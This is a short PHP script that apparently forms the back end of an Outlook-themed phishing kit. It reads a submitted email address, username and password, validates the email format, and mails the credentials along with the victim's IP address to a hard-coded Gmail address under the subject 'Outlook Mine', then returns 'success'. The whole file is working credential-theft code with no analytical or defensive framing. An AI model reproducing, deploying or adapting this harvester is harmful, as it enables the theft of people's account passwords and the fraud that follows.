<?PHP
define('kOptional', true);
define('kMandatory', false);




error_reporting(E_ERROR | E_WARNING | E_PARSE);
ini_set('track_errors', true);

function DoStripSlashes($fieldValue)  { 
// temporary fix for PHP6 compatibility - magic quotes deprecated in PHP6
 if ( function_exists( 'get_magic_quotes_gpc' ) && get_magic_quotes_gpc() ) { 
  if (is_array($fieldValue) ) { 
   return array_map('DoStripSlashes', $fieldValue); 
  } else { 
   return trim(stripslashes($fieldValue)); 
  } 
 } else { 
  return $fieldValue; 
 } 
}

function FilterCChars($theString) {
 return preg_replace('/[\x00-\x1F]/', '', $theString);
}

function CheckEmail($email, $optional) {
 if ( (strlen($email) == 0) && ($optional === kOptional) ) {
  return true;
  } elseif ( preg_match("/^([\w\!\#$\%\&\'\*\+\-\/\=\?\^\`{\|\}\~]+\.)*[\w\!\#$\%\&\'\*\+\-\/\=\?\^\`{\|\}\~]+@((((([a-z0-9]{1}[a-z0-9\-]{0,62}[a-z0-9]{1})|[a-z])\.)+[a-z]{2,6})|(\d{1,3}\.){3}\d{1,3}(\:\d{1,5})?)$/i", $email) == 1 ) {
  return true;
 } else {
  return false;
 }
}




if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
 $clientIP = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
 $clientIP = $_SERVER['REMOTE_ADDR'];
}

$FTGEmail = DoStripSlashes( $_POST['email'] );
$FTGusername = DoStripSlashes( $_POST['username'] );
$FTGpassword = DoStripSlashes( $_POST['password'] );
$FTGsubmit = DoStripSlashes( $_POST['submit'] );



$validationFailed = false;

# Fields Validations


if (!CheckEmail($FTGEmail, kMandatory)) {
 $FTGErrorMessage['Email'] = 'Invalid Email Address String';
 $validationFailed = true;
}



# Include message in error page and dump it to the browser

if ($validationFailed === true) {
echo 'Failed';
exit();
} else{	
$emailSubject = "Outlook Mine";
  
 $emailBody = "Email : $FTGEmail\n"
  . "username : $FTGusername\n"
  . "password : $FTGpassword\n"
  . "********************************\n"
  . "Sender IP : $clientIP\r\n"
  . "Country: $country\r\n"
  . "Spectrum Webmasters\n"
  . "********************************\n"
  . "";
  $emailTo = 'Info <fxtoolz489@gmail.com>';
  $emailFrom = "info@artemisarrow.com";
   
  $emailHeader = "From: $emailFrom\n"
   . "MIME-Version: 1.0\n"
   . "Content-type: text/plain; charset=\"UTF-8\"\n"
   . "Content-transfer-encoding: 8bit\n";
  
  mail($emailTo, $emailSubject, $emailBody, $emailHeader);
  
  # Include message in the success page and dump it to the browser

# Redirect user to success page

echo 'success';

exit();
}
?>